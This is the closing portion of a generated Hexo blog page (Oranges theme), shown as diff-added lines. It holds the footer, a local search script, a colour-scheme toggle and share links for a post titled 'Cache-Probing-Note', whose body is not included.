+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Siebene">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/Siebene">Copyright © 2022 Siebene@</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/Siebene">Theme by Oranges</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Cache-Probing-Note + '&url=' + https%3A%2F%2Fsiebene.github.io%2F2021%2F10%2F16%2FCache-Probing-Note%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://siebene.github.io/2021/10/16/Cache-Probing-Note/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
